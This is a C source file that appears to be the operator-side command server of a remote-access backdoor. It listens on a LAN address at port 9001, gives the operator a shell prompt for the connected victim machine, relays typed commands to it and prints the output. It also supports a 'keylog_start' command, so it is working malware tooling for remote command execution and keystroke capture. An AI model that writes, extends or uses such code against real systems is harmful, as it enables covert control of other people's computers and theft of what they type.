#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    int sock, client_socket;
    int opval = 1;
    char buffer[1024];
    char response[18768];
    struct sockaddr_in server_address, client_address;
    socklen_t client_length;
    
    printf("[*] Server Started.\n");
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opval, sizeof(opval)) < 0) {
        printf("Error Setting TCP Socket Options :(\n");
        return 1;
    }
    
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.1.229");
    server_address.sin_port = htons(9001);

    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(sock, 2);

    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    printf("[+] Connection Established\n");

    while (1) {
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* Shell@%s~$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if (strncmp("q", buffer, 1) == 0) {
            break;
        } else if (strncmp("cd ", buffer, 3) == 0) {
            continue;
        } else if (strncmp("keylog_start", buffer, 12) == 0){
            continue;
        } else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }
    printf("[*] Server Stopped.\n");

    return 0;
}
